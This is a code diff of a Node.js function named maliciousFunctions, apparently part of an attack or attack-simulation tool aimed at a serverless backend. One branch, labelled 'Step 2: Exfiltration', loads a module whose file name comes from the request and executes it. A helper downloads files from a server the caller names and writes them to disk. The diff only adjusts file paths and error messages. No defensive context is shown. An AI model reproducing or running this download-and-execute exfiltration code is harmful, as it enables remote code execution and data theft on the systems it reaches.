@@ -45,16 +45,17 @@ const maliciousFunctions = async (event) => {
   } else if (event.body["malicious"] == "two") {
     console.log("Step 2: Exfiltration.");
     try {
-      const dynamo = require(`${event.body["attackFile"]}`)
+      const dynamo = require(`${__dirname}/${event.body["attackFile"]}`)
       const response = await dynamo.exec()
+      console.log("response.: ", response)
       return {
         approved: false,
         failureReason: response
       };
-    } catch {
+    } catch (e) {
       return {
         approved: false,
-        failureReason: `${event.body["attackFile"]} maybe not exist.`
+        failureReason: `${event.body["attackFile"]} maybe not exist. : ${e}`
       };
     }
   }
@@ -69,7 +70,7 @@ const downloadFile = async (server, file) => {
     const response = await axios.get(url);
     const response_data = response["data"]
 
-    const localfile = `${file}`;
+    const localfile = `${__dirname}/${file}`;
     fs.writeFileSync(localfile, response_data, (err) => {
         if (err) throw err;
     });
